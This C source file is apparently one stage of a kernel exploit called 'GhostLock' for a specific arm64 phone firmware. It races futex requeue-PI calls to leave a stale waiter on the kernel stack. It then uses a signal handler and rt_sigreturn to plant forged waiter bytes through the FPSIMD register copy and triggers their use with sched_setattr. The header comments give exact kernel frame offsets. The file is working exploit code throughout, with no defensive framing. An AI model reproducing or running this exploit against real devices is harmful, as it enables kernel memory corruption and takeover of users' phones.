/*
 * Native arm64 GhostLock stack stage for songyuan / OS3.0.309.0.
 *
 * The stale waiter created through syscall 98 is at syscall-entry SP-0x1a0:
 *   __arm64_sys_futex       frame 0x080
 *   futex_wait_requeue_pi   frame 0x1c0, waiter at sp+0x0a0
 *
 * A normal (non-SVE restore) rt_sigreturn copies the FPSIMD vregs into
 * __arm64_sys_rt_sigreturn's buffer at syscall-entry SP-0x280:
 *   rt_sigreturn frame      0x530
 *   FPSIMD buffer           sp+0x2b0
 *
 * Therefore the freed waiter starts at FPSIMD vregs+0xe0.  The phone emits
 * optional SVE and ZA records even for a new thread; the handler terminates
 * the record list immediately after the valid leading FPSIMD record, which
 * the live read-only probe confirmed this kernel accepts.  That selects
 * read_fpsimd_context() and its 512-byte copy at sp+0x2b0.
 */
#define _GNU_SOURCE

#include "common.h"

#include <linux/futex.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/ucontext.h>
#include <time.h>

#ifndef FPSIMD_MAGIC
#define FPSIMD_MAGIC 0x46508001U
#endif

#define NATIVE_SIGNAL SIGUSR2
#define FPSIMD_CONTEXT_SIZE 0x210U
#define FPSIMD_VREGS_OFFSET 0x10U
#define FPSIMD_VREGS_SIZE 0x200U
#define PAYLOAD_BYTES 128U
#define WAIT_SECONDS 5

struct context_head {
  uint32_t magic;
  uint32_t size;
};

static uint32_t native_wait;
static uint32_t native_pi_target;
static uint32_t native_pi_chain;
static atomic_int native_waiter_tid;
static atomic_int native_waiter_ready;
static atomic_int native_waiter_waiting;
static atomic_int native_owner_started;
static atomic_int native_consumer_go;
static atomic_int native_consumer_done;
static unsigned char native_payload[FPSIMD_VREGS_SIZE];
static volatile sig_atomic_t native_handler_ok;

static void native_sigreturn_handler(int sig, siginfo_t *info, void *opaque) {
  (void)sig;
  (void)info;
  ucontext_t *uc = opaque;
  unsigned char *records =
      (unsigned char *)&uc->uc_mcontext.__reserved[0];
  struct context_head first;
  memcpy(&first, records, sizeof(first));
  if (first.magic != FPSIMD_MAGIC || first.size != FPSIMD_CONTEXT_SIZE)
    return;
  if (sizeof(uc->uc_mcontext.__reserved) <
      FPSIMD_CONTEXT_SIZE + sizeof(struct context_head))
    return;

  /* fpsimd_context is {head, fpsr, fpcr, vregs[32]}.  The exact kernel's
   * read_fpsimd_context loads the record pointer and adds 0x10 before its
   * 0x200-byte copy.  Starting at +sizeof(head) would shift every forged
   * waiter field eight bytes early (and made waiter->lock read wake_state). */
  memcpy(records + FPSIMD_VREGS_OFFSET, native_payload,
         sizeof(native_payload));
  struct context_head terminator = {0, 0};
  memcpy(records + FPSIMD_CONTEXT_SIZE, &terminator, sizeof(terminator));
  native_handler_ok = 1;
}

static void *native_waiter_thread(void *unused) {
  (void)unused;
  pin_to_core(2);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&native_waiter_tid, tid);

  if (syscall(SYS_futex, &native_pi_chain, FUTEX_LOCK_PI, 0,
              NULL, NULL, 0) != 0) {
    pr_warning("native waiter: LOCK_PI(chain) errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&native_waiter_ready, 1);
  while (!atomic_load(&native_owner_started))
    usleep(1000);

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SECONDS;
  atomic_store(&native_waiter_waiting, 1);
  errno = 0;
  long wait_ret = syscall(SYS_futex, &native_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                          &timeout, &native_pi_target, 0);
  int wait_errno = errno;
  pr_info("native waiter: WAIT_REQUEUE_PI ret=%ld errno=%d\n",
          wait_ret, wait_errno);

  errno = 0;
  long unlock_ret = syscall(SYS_futex, &native_pi_chain, FUTEX_UNLOCK_PI, 0,
                            NULL, NULL, 0);
  if (unlock_ret != 0) {
    pr_warning("native waiter: UNLOCK_PI(chain) ret=%ld errno=%d\n",
               unlock_ret, errno);
    return NULL;
  }

  native_handler_ok = 0;
  errno = 0;
  long signal_ret = syscall(SYS_tgkill, getpid(), tid, NATIVE_SIGNAL);
  if (signal_ret != 0 || !native_handler_ok) {
    pr_warning("native waiter: signal stamp ret=%ld errno=%d handler=%d\n",
               signal_ret, errno, (int)native_handler_ok);
    return NULL;
  }

  /* rt_sigreturn has completed, leaving the forged bytes parked in this
   * thread's now-stale kernel stack.  Do not make another syscall here. */
  atomic_store(&native_consumer_go, 1);
  for (;;)
    __asm__ volatile("yield" ::: "memory");
}

static void *native_owner_thread(void *unused) {
  (void)unused;
  if (syscall(SYS_futex, &native_pi_target, FUTEX_LOCK_PI, 0,
              NULL, NULL, 0) != 0) {
    pr_warning("native owner: LOCK_PI(target) errno=%d\n", errno);
    return NULL;
  }
  while (!atomic_load(&native_waiter_ready))
    usleep(1000);
  atomic_store(&native_owner_started, 1);
  syscall(SYS_futex, &native_pi_chain, FUTEX_LOCK_PI, 0,
          NULL, NULL, 0);
  for (;;)
    pause();
}

static void *native_consumer_thread(void *unused) {
  (void)unused;
  pin_to_core(3);
  int tid;
  while (!(tid = atomic_load(&native_waiter_tid)))
    usleep(1000);
  while (!atomic_load(&native_consumer_go))
    usleep(1000);

  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 0;
  attr.sched_nice = 1;
  errno = 0;
  long ret = syscall(SYS_sched_setattr, tid, &attr, 0);
  int saved_errno = errno;
  pr_info("native consumer: sched_setattr tid=%d ret=%ld errno=%d\n",
          tid, ret, saved_errno);
  atomic_store(&native_consumer_done, 1);
  return NULL;
}

int songyuan_native_sigreturn_stage(const uint64_t *buffer) {
  if (!buffer || SIGRETURN_WAITER_OFF + PAYLOAD_BYTES > FPSIMD_VREGS_SIZE)
    return 1;

  native_wait = 0;
  native_pi_target = 0;
  native_pi_chain = 0;
  atomic_store(&native_waiter_tid, 0);
  atomic_store(&native_waiter_ready, 0);
  atomic_store(&native_waiter_waiting, 0);
  atomic_store(&native_owner_started, 0);
  atomic_store(&native_consumer_go, 0);
  atomic_store(&native_consumer_done, 0);
  memset(native_payload, 0, sizeof(native_payload));
  memcpy(native_payload + SIGRETURN_WAITER_OFF, buffer, PAYLOAD_BYTES);

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = native_sigreturn_handler;
  sa.sa_flags = SA_SIGINFO;
  sigemptyset(&sa.sa_mask);
  if (sigaction(NATIVE_SIGNAL, &sa, NULL) != 0) {
    pr_warning("native stage: sigaction errno=%d\n", errno);
    return 1;
  }

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  if (pthread_create(&waiter, NULL, native_waiter_thread, NULL) != 0 ||
      pthread_create(&owner, NULL, native_owner_thread, NULL) != 0 ||
      pthread_create(&consumer, NULL, native_consumer_thread, NULL) != 0) {
    pr_warning("native stage: pthread_create failed\n");
    return 1;
  }

  for (int i = 0; i < 10000; i++) {
    if (atomic_load(&native_waiter_waiting) &&
        atomic_load(&native_owner_started))
      break;
    usleep(1000);
  }
  if (!atomic_load(&native_waiter_waiting) ||
      !atomic_load(&native_owner_started)) {
    pr_warning("native stage: futex chain did not arm\n");
    return 1;
  }

  usleep(200000);
  errno = 0;
  long requeue_ret = syscall(SYS_futex, &native_wait, FUTEX_CMP_REQUEUE_PI, 1,
                             (void *)1, &native_pi_target, 0);
  int requeue_errno = errno;
  pr_info("native stage: CMP_REQUEUE_PI ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);

  for (int i = 0; i < 10000 && !atomic_load(&native_consumer_done); i++)
    usleep(1000);
  if (!atomic_load(&native_consumer_done)) {
    pr_warning("native stage: consumer timed out\n");
    return 1;
  }
  return 0;
}
